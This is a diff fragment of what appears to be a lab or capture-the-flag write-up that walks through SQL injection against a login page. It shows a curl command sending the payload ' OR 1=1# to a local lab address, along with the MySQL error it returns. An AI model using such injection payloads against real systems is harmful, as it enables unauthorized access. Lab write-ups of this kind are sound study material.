@@ -31,7 +31,7 @@ So try admin' in the input box and it  shows us a sql error.
 ```
 There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1]
 ```
-So we try doing the usual ' OR 1=1# and we get nothing. Checking the error message again it seems like OR is being filtered out.
+So we try doing the usual ' OR 1=1# and get nothing. Checking the error message again it seems like OR is being filtered out.
 ```
 curl --data "email=admin&password=' OR 1=1#" http://192.168.56.101/login.php
 There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '11#'' at line 1]
